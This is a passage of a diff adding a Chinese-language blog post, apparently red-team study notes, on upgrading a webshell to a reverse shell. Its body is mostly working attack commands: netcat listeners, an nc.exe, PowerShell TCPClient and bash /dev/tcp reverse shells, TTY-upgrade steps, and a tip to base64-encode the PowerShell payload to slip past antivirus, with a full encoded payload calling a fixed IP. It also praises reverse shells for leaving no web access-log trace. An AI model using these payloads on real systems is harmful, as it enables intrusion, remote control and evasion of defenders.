@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="VnNixUxQwNBvFc-nAdXdfYkKhdk4ncl53flMSHEm1gw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="什么是webshell：通过web漏洞，我们可以拿到网站的webshell，这是ISW综合提权的第一步 Webshell 简单来说，就是一个运行在网站服务器上的“后门脚本”。 把它想象成：黑客在别人的服务器里悄悄安装了一个网页版的控制台。通过访问这个特定的网址（网页），黑客就可以在浏览器里输入命令，来操作这台服务器，比如查看文件、下载数据、或者用这台服务器去攻击别人。 长类似下面这个样子  但是w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web渗透10：优化webshell">
+<meta property="og:url" content="http://example.com/2026/03/20/ISW/Web%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F10_%E4%BC%98%E5%8C%96webshell/index.html">
+<meta property="og:site_name" content="s0m1ng">
+<meta property="og:description" content="什么是webshell：通过web漏洞，我们可以拿到网站的webshell，这是ISW综合提权的第一步 Webshell 简单来说，就是一个运行在网站服务器上的“后门脚本”。 把它想象成：黑客在别人的服务器里悄悄安装了一个网页版的控制台。通过访问这个特定的网址（网页），黑客就可以在浏览器里输入命令，来操作这台服务器，比如查看文件、下载数据、或者用这台服务器去攻击别人。 长类似下面这个样子  但是w">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/ISW/Web%E6%B8%97%E9%80%8F/%E4%BC%98%E5%8C%96shell/websehll.png">
+<meta property="article:published_time" content="2026-03-20T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-20T10:04:10.362Z">
+<meta property="article:author" content="s0m1ng">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="Web渗透">
+<meta property="article:tag" content="优化shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/ISW/Web%E6%B8%97%E9%80%8F/%E4%BC%98%E5%8C%96shell/websehll.png">
+
+<link rel="canonical" href="http://example.com/2026/03/20/ISW/Web%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F10_%E4%BC%98%E5%8C%96webshell/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Web渗透10：优化webshell | s0m1ng</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="s0m1ng" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">s0m1ng</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制学习中</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+  <a href="https://github.com/som1ng" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/20/ISW/Web%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F10_%E4%BC%98%E5%8C%96webshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/profile_photo.jpg">
+      <meta itemprop="name" content="s0m1ng">
+      <meta itemprop="description" content="学习逆向贵在坚持">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0m1ng">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web渗透10：优化webshell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-03-20 08:00:00 / 修改时间：18:04:10" itemprop="dateCreated datePublished" datetime="2026-03-20T08:00:00+08:00">2026-03-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/" itemprop="url" rel="index"><span itemprop="name">ISW</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/Web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+  
+  <h1 id="什么是webshell："><a href="#什么是webshell：" class="headerlink" title="什么是webshell："></a>什么是webshell：</h1><p>通过web漏洞，我们可以拿到网站的webshell，这是<strong>ISW综合提权</strong>的第一步</p>
+<p><strong>Webshell</strong> 简单来说，就是一个运行在网站服务器上的“后门脚本”。</p>
+<p>把它想象成：黑客在别人的服务器里悄悄安装了一个<strong>网页版的控制台</strong>。通过访问这个特定的网址（网页），黑客就可以在浏览器里输入命令，来操作这台服务器，比如查看文件、下载数据、或者用这台服务器去攻击别人。</p>
+<p>长类似下面这个样子</p>
+<p><img data-src="/images/ISW/Web渗透/优化shell/websehll.png" alt="websehll"></p>
+<p>但是webshell有很多缺点，这就需要我们反弹一个shell获得完整的TTY</p>
+<h1 id="为什么必须从-WebShell-转换到反弹-Shell"><a href="#为什么必须从-WebShell-转换到反弹-Shell" class="headerlink" title="为什么必须从 WebShell 转换到反弹 Shell"></a>为什么必须从 WebShell 转换到反弹 Shell</h1><h2 id="交互性不好"><a href="#交互性不好" class="headerlink" title="交互性不好"></a>交互性不好</h2><p><strong>WebShell</strong>：每发一条命令都是一个新的 HTTP 请求。如果程序运行到一半问你 <code>Are you sure? [y/n]</code>，由于请求已经结束，你没法再“回信”去输入那个 <code>y</code>。</p>
+<ul>
+<li><strong>反弹Shell</strong>：建立的是 TCP 长连接。你可以实时输入、实时看到回显。</li>
+</ul>
+<h2 id="稳定性与超时问题"><a href="#稳定性与超时问题" class="headerlink" title="稳定性与超时问题"></a>稳定性与超时问题</h2><p><strong>WebShell</strong>：Web 服务器（如 IIS/Apache）对每个脚本的运行时间都有严格限制（通常是 30-120 秒）。</p>
+<p><strong>后果</strong>：跑到一半，Web 服务器会觉得脚本运行太久了，强行杀掉进程。你的提权扫描结果会直接中断消失。</p>
+<ul>
+<li><strong>反弹Shell 的优势</strong>：它是一个独立的系统进程，不受 Web 服务器超时限制。</li>
+</ul>
+<h2 id="隐蔽性与日志问题"><a href="#隐蔽性与日志问题" class="headerlink" title="隐蔽性与日志问题"></a>隐蔽性与日志问题</h2><p><strong>WebShell</strong>：你敲的每一条命令都会在 Web 服务器的访问日志（Access Log）里留下记录。</p>
+<ul>
+<li><strong>反弹Shell 的优势</strong>：连接建立后，后续所有的命令传输都是底层流，不会记录在 Web 访问日志里。</li>
+</ul>
+<h1 id="如何反弹shell到自己的攻击机："><a href="#如何反弹shell到自己的攻击机：" class="headerlink" title="如何反弹shell到自己的攻击机："></a>如何反弹shell到自己的攻击机：</h1><ol>
+<li>Ubuntu 坐等接听 (监听)</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444 <span class="comment"># 靶机是linux</span></span><br><span class="line">rlwrap nc -lvnp 4444 <span class="comment"># 靶机是windows</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li>控制靶机(反弹)</li>
+</ol>
+<ul>
+<li><p><strong>Windows (CMD，需要先上传 nc.exe)</strong>:（注意：原生 CMD 是没有网络通信功能的，你必须先通过蚁剑或漏洞，传一个 Windows 版的 <code>nc.exe</code> 到靶机的可写目录（如 <code>C:\Windows\Temp\</code>））。 然后执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\nc.exe 你的Ubuntu_IP 4444 -e cmd.exe</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ul>
+<li><p><strong>Windows (PowerShell)</strong>:如果系统允许执行 PS，直接用这段命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;你的Ubuntu_IP&#x27;,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<ul>
+<li><p><strong>Linux (Bash)</strong>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/你的Ubuntu_IP/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="如何让你的-Shell-变完美-TTY-交互式-Shell-升级"><a href="#如何让你的-Shell-变完美-TTY-交互式-Shell-升级" class="headerlink" title="如何让你的 Shell 变完美(TTY 交互式 Shell 升级)"></a>如何让你的 Shell 变完美(TTY 交互式 Shell 升级)</h1><p>一旦连接成功，你在 Ubuntu 的 <code>nc</code> 窗口里就会得到一个目标服务器的 Shell。但这个原始的 Shell 是一个“残疾”版本，我们必须对它进行“升级”。</p>
+<h2 id="为什么要升级成“完全交互式-Shell”"><a href="#为什么要升级成“完全交互式-Shell”" class="headerlink" title="为什么要升级成“完全交互式 Shell”"></a>为什么要升级成“完全交互式 Shell”</h2><p>原始的 <code>nc</code> 反弹 Shell 存在非常致命的缺陷：</p>
+<ol>
+<li><p><strong>不能使用快捷键中断进程</strong>：如果你习惯性地按下 <code>Ctrl+C</code> 想停止当前正在跑的脚本，<strong>它会直接把整个 Shell 连接掐断</strong>，你得重新去打漏洞</p>
+</li>
+<li><p><strong>没有命令补全</strong>：按 <code>Tab</code> 键只会出空格，无法补全长长的文件路径。</p>
+</li>
+<li><p><strong>没有历史记录</strong>：按“上下方向键”不会显示上一条命令，只会输出乱码（如 <code>^[[A</code>）。</p>
+</li>
+<li><p><strong>无法运行交互程序</strong>：跑不了 <code>vim</code>、<code>nano</code>，甚至连 <code>su</code> 切换用户输入密码都会卡死。不能用 <code>clear</code> 清屏。</p>
+</li>
+</ol>
+<h2 id="Linux-靶机升级："><a href="#Linux-靶机升级：" class="headerlink" title="Linux 靶机升级："></a>Linux 靶机升级：</h2><p>为了解决上述所有痛点，当你拿到一个 Linux 的基础 Shell 时，请立刻形成肌肉记忆，连敲这五步：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 在 nc 得到的 Shell 里，打开一个完整的伪终端 (pty)</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># (此时提示符会变得更好看，比如转为 bash-4.4$)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 按 Ctrl+Z 把这个靶机进程“挂起”并放到后台</span></span><br><span class="line"><span class="comment"># (你会短暂回到自己 Ubuntu 的终端提示符)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 在你自己 Ubuntu 的终端里，关闭本地终端回显，并让终端处理远程的原始输入</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 接着按两次回车</span></span><br><span class="line"><span class="comment"># (此时你又回到了靶机的终端里)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 最后，配置终端环境变量，告诉靶机你的屏幕支持彩色和清屏指令</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color</span><br></pre></td></tr></table></figure>
+<p>经过这五步，你那个简陋的 <code>nc</code> 窗口就变成了一个<strong>功能完备、可以 Tab 补全路径、可以用 Vim 编辑文件、按 Ctrl+C 只会停止当前命令而不断开连接</strong>的完美交互式 Shell 了</p>
+<h2 id="Windows-靶机升级"><a href="#Windows-靶机升级" class="headerlink" title="Windows 靶机升级"></a>Windows 靶机升级</h2><p><strong>注意：上面的五步只对 Linux 靶机有效</strong> Windows 没有 <code>/bin/bash</code> 也没有 <code>pty</code> 模块。</p>
+<ul>
+<li>对付 Windows，最简单的方法是<strong>在监听时使用 rlwrap</strong>：在你的 Ubuntu 里安装 <code>sudo apt install rlwrap</code>，然后用 <code>rlwrap nc -lvnp 4444</code> 来监听。这样接回来的 Windows CMD 至少可以使用“上下左右键”来修改命令和查看历史记录，能极大地提升幸福感。</li>
+</ul>
+<h1 id="小tips："><a href="#小tips：" class="headerlink" title="小tips："></a>小tips：</h1><ol>
+<li>如果我们的命令被windows服务器杀软查到了，我们可以先base64编码一下命令再在powershell上自解密执行</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s0m1ng@LAPTOP-EV3HBGTC:~$ python3 -c <span class="string">&quot;import base64; cmd = \&quot;\$client = New-Object System.Net.Sockets.TCPClient(&#x27;10.243.120.200&#x27;,4444);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%&#123;0&#125;;while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)&#123;;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2&gt;&amp;1 | Out-String );\$sendback2  = \$sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()&#125;;\$client.Close()\&quot;; print(&#x27;\n[+] 请在蚁剑中执行以下命令绕过杀软：\n&#x27;); print(&#x27;powershell -e &#x27; + base64.b64encode(cmd.encode(&#x27;utf-16le&#x27;)).decode() + &#x27;\n&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">#用下面的输出结果复制到powershell</span></span><br><span class="line">powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMgA0ADMALgAxADIAMAAuADIAMAAwACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</span><br></pre></td></tr></table></figure>
+<ol>
+<li>以什么权限反弹的shell，在Ubuntu上就是什么权限</li>
+</ol>
+
+
+
+    
+    
+    
+        <div class="reward-container">
+  <div>您的支持将鼓励我继续创作!</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/reward.jpg" alt="s0m1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>s0m1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2026/03/20/ISW/Web%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F10_%E4%BC%98%E5%8C%96webshell/" title="Web渗透10：优化webshell">http://example.com/2026/03/20/ISW/Web渗透/Web渗透10_优化webshell/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/Web%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> Web渗透</a>
+              <a href="/tags/%E4%BC%98%E5%8C%96shell/" rel="tag"><i class="fa fa-tag"></i> 优化shell</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%834_SUID%20%E6%9C%BA%E5%88%B6%E6%BB%A5%E7%94%A8%20(%E6%8F%90%E6%9D%83%E9%87%8D%E7%82%B9%E5%8C%BA)/" rel="prev" title="Linux提权4：SUID 机制滥用 (红队笔记)">
+      <i class="fa fa-chevron-left"></i> Linux提权4：SUID 机制滥用 (红队笔记)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%835_%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%20(Cron)%20%E6%BC%8F%E6%B4%9E/" rel="next" title="Linux提权5：计划任务漏洞 (红队笔记)">
+      Linux提权5：计划任务漏洞 (红队笔记) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFwebshell%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">什么是webshell：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BF%85%E9%A1%BB%E4%BB%8E-WebShell-%E8%BD%AC%E6%8D%A2%E5%88%B0%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">2.</span> <span class="nav-text">为什么必须从 WebShell 转换到反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%A4%E4%BA%92%E6%80%A7%E4%B8%8D%E5%A5%BD"><span class="nav-number">2.1.</span> <span class="nav-text">交互性不好</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%B3%E5%AE%9A%E6%80%A7%E4%B8%8E%E8%B6%85%E6%97%B6%E9%97%AE%E9%A2%98"><span class="nav-number">2.2.</span> <span class="nav-text">稳定性与超时问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9A%90%E8%94%BD%E6%80%A7%E4%B8%8E%E6%97%A5%E5%BF%97%E9%97%AE%E9%A2%98"><span class="nav-number">2.3.</span> <span class="nav-text">隐蔽性与日志问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" 